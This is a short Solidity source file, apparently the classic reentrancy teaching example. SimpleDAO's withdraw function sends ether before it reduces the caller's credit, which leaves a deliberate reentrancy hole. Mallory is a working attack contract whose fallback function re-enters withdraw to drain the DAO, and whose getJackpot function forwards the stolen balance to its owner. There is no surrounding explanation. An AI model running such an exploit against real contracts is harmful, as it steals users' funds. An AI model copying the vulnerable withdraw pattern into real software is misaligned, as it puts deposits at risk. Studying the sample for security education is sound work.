pragma solidity ^0.4.0;

contract SimpleDAO {
 	mapping (address => uint) public credit;
 	function donate(address to) payable {
		credit[to] += msg.value;
	}
 	function queryCredit(address to) constant returns (uint) {
 		return credit[to];
	}
 	function withdraw(uint amount) {
 		if (credit[msg.sender] >= amount) {
 			msg.sender.call.value(amount)();
 			credit[msg.sender] -= amount;
 		}
	}
}

contract Mallory {
    event LogCall(uint x);
	SimpleDAO public dao;
	address owner;
	function Mallory(SimpleDAO _dao) {
		dao = _dao;
		owner = msg.sender; 
	}
	function() payable {
	    LogCall(this.balance);
		dao.withdraw(dao.queryCredit(this)); 
	}
	function getJackpot() { 
		owner.send(this.balance); 
	}
}
